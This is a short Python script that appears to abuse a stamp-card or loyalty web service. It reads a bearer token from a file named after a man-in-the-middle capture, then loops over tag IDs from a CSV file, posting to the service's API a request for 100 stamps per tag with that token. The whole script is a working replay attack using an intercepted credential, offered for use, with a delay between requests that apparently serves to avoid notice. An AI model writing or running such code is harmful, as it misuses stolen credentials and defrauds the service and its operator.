import json, time
import requests
from pathlib import Path


TOKEN_FILE = Path.home() / "sqwebapp" / "mitm_get_results.jsonl"
UID_FILE = Path.home() / "sqwebapp" / "train.csv"
API_URL = SQUID_API_URL
OUTPUT_FILE = Path.home() / "sqwebapp" / "tags.csv"

def load_uids(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    uids = content.replace(",", " ").split()
    return uids

def load_bearer(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
           for line in f:
               record = json.loads(line.strip())
               auth_token = record.get("bearer_token")
    return auth_token
    #print(f"Extracted Bearer Token: {auth_token}")

if __name__ == "__main__":
    bearer_token = load_bearer(TOKEN_FILE)

    uids = load_uids(UID_FILE)
    for i in uids:
        print(f"Loaded UID: {i}")
    bearer_token = load_bearer(TOKEN_FILE)

    for uid in uids:
        try:
            payload = {
                "stampData": {
                    "tagId": uid,
                    "offline": False,
                    "numStamps": 100,
                    "nonauth": False
                }
            }
            response = requests.post(
                API_URL,
                json=payload,
                headers={
                    "Authorization": f"Bearer {bearer_token}"
                },
                timeout=10,
            )

            print(
                f"UID: {uid}, "
                f"Status Code: {response.status_code}, "
            )
            time.sleep(5)

        except requests.RequestException as e:
            print(f"Error fetching data for UID: {uid}, Error: {e}")